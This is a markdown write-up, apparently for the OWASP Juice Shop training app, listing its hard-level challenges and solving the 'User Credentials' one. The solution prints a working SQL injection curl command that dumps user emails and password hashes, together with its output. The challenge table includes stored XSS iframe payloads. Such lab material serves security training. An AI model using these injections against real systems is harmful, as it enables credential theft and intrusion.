# Level 4 - Hard Challenges

## Challenges

| Challenge | Description | Status |
| --- | --- | --- |
| Access Log | Gain access to any access log file of the server. | :heavy_minus_sign:
| Christmas Special | Order the Christmas special offer of 2014. | :heavy_minus_sign:
| DLP Failure Tier 1 | Identify an unsafe product that was removed from the shop and inform the shop which ingredients are dangerous. | :heavy_minus_sign:
| Easter Egg Tier 1 | Find the hidden easter egg. | :heavy_minus_sign:
| Easter Egg Tier 2 | Apply some advanced cryptanalysis to find the real easter egg. | :heavy_minus_sign:
| Expired Coupon | Successfully redeem an expired campaign coupon code. | :heavy_minus_sign:
| Forgotten Developer Backup | Access a developer's forgotten backup file. | :heavy_minus_sign:
| Forgotten Sales Backup | Access a salesman's forgotten backup file. | :heavy_minus_sign:
| GDPR Compliance Tier 2 | Steal someone else's personal data without using Injection. | :heavy_minus_sign:
| Login Bjoern | Log in with Bjoern's Gmail account without previously changing his password, applying SQL Injection, or hacking his Google account. | :heavy_minus_sign:
| Misplaced Signature File | Access a misplaced SIEM signature file. | :heavy_minus_sign:
| NoSQL Injection Tier 1 | Let the server sleep for some time. (It has done more than enough hard work for you) | :heavy_minus_sign:
| NoSQL Injection Tier 2 | Update multiple product reviews at the same time. | :heavy_minus_sign:
| Redirects Tier 2 | Wherever you go, there you are. | :heavy_minus_sign:
| Reset Bender's Password | Reset Bender's password via the Forgot Password mechanism with the original answer to his security question. | :heavy_minus_sign:
| Steganography Tier 1 | Rat out a notorious character hiding in plain sight in the shop. (Mention the exact name of the character) | :heavy_minus_sign:
| Typosquatting Tier 1 | Inform the shop about a typosquatting trick it has become victim of. (Mention the exact name of the culprit) | :heavy_minus_sign:
| [User Credentials](#user-credentials) | Retrieve a list of all user credentials via SQL Injection | :heavy_minus_sign:
| Vulnerable Library | Inform the shop about a vulnerable library it is using. (Mention the exact library name and version in your comment) | :heavy_minus_sign:
| XSS Tier 4 | Perform a persisted XSS attack with `<iframe src="javascript:alert('xss')">` bypassing a server-side security mechanism. | :heavy_minus_sign:
| XSS Tier 5 | Perform a persisted XSS attack with `<iframe src="javascript:alert('xss')">` through an HTTP header. | :heavy_minus_sign:

## Solutions

### User Credentials

> Retrieve a list of all user credentials via SQL Injection

* Solved? :white_check_mark:
* Tools Used: Chrome

This one I stumbled upon by accident. I basically was looking at different endpoints, and attempting SQL injection for another challenge. My curl command looked like so, and the next time I visited the site in Chrome, I saw a nice green banner.

```bash
curl "http://172.16.189.131:3000/rest/products/search?q=Forensic'%20or%201=2))%20UNION%20ALL%20SELECT%20id,email%20as%20name,password%20as%20description,1%20as%20price,null,null,null,null%20from%20users--" -s | jq
{
  "status": "success",
  "data": [
    {
      "id": 1,
      "name": "admin@juice-sh.op",
      "description": "0192023a7bbd73250516f069df18b500",
      "price": 1,
      "image": null,
      "createdAt": null,
      "updatedAt": null,
      "deletedAt": null
    },
    {
      "id": 2,
      "name": "jim@juice-sh.op",
      "description": "e541ca7ecf72b8d1286474fc613e5e45",
      "price": 1,
      "image": null,
      "createdAt": null,
      "updatedAt": null,
      "deletedAt": null
    }, 
    /* etc */
  ]
}
```

<img src="images/4-users-sql-injection-solved.png">


